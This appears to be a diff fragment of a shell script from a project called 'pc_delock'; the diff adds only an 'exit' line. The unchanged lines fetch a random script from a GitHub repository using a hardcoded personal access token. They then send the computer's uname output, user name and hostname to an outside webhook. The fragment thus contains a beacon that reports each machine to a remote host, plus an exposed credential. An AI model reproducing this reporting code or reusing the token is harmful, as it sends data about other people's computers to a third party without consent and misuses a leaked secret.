@@ -7,3 +7,4 @@ curl -s -H 'Authorization: token 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' "http
 curl \
   -H "Content-Type: application/json" \
   -d "{\"content\":null,\"embeds\":[{\"title\":\"Script n°$rdm\", \"description\": \"$(curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh" | sed '2q;d')\",\"url\":\"https://raw.githubusercontent.com/Waz0x/pc_delock/master/scripts/$rdm.sh\",\"color\":16711680,\"fields\":[{\"name\":\"uname:\",\"value\":\"$(uname -a)\"},{\"name\":\"user\",\"value\":\"$USER\"},{\"name\":\"hostname\",\"value\":\"$(hostname)\"}]}]}" $WEBHOOK_URL
+exit
